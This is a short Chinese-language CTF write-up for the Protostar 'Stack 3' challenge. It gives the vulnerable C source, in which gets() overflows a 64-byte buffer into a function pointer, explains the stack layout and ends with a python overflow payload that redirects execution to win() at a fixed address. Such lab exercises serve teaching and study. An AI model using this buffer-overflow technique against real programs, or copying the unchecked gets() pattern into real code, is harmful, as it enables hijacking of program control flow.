# Stack 3

## （一） 题目：

\#include &lt;stdlib.h&gt;

\#include &lt;unistd.h&gt;

\#include &lt;stdio.h&gt;

\#include &lt;string.h&gt;

void win\(\)

{

printf\("code flow successfully changed\n"\);

}

int main\(int argc, char \*\*argv\)

{

volatile int \(\*fp\)\(\);

char buffer\[64\];

fp = 0;

gets\(buffer\);

if\(fp\) {

```
  printf\("calling function pointer, jumping to 0x%08x\n", fp\);

  fp\(\);
```

}

}

## （二）解题过程：

依旧是栈溢出的题目。变量 函数在内存中的分配和调用顺序

buffer\[64\]

\*fp

ebp

返回地址

argc

argv

本题就是要把指针地址修改成win\(\)的入口地址。

先覆盖\*fp

覆盖后的地址是win\(\)入口地址

思路：

python -c "print 'a'\*64+ win\(\)入口地址"

用gdb或者ida查看win\(\)入口地址

![](/png/11.png) 

地址为0x08048424

所以exploit中的payload

python -c "print 'a'\*64+'\x24\x84\x04\x08'







